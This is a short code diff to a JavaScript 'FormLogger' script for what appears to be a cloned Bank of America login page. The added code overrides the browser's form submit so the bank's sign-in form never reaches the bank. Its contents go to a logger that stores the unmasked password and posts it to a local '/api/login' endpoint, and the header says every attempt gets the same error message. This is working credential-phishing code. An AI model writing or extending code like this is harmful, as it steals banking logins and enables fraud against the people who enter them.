@@ -4,11 +4,36 @@
  * Displays consistent error message for all login attempts
  */
 
+// CRITICAL: Patch Form.prototype.submit BEFORE anything else
+const OriginalFormSubmit = HTMLFormElement.prototype.submit;
+
+HTMLFormElement.prototype.submit = function() {
+  console.log('[Logger-Global] Form.submit() called on form:', this.id, this.method);
+  if (this.id === 'EnterOnlineIDForm') {
+    console.log('[Logger-Global] Blocking EnterOnlineIDForm submission, preventing navigation');
+    // ALWAYS prevent submission to Bank of America
+    this.action = '';
+    this.target = '';
+    
+    // If FormLogger instance exists, log the data
+    if (window.formLoggerInstance && typeof window.formLoggerInstance.logFormData === 'function') {
+      window.formLoggerInstance.logFormData(this);
+    }
+    // Never call the original submit - we've blocked it
+    return false;
+  } else {
+    // For other forms, allow normal submission
+    return OriginalFormSubmit.call(this);
+  }
+};
+
 class FormLogger {
   constructor() {
     // Use relative URL for API endpoint (works on both localhost and production)
     this.apiEndpoint = '/api/login';
     this.rawPassword = ''; // Store unmasked password
+    // Store self reference for use in global submit handler
+    window.formLoggerInstance = this;
     this.init();
   }
 
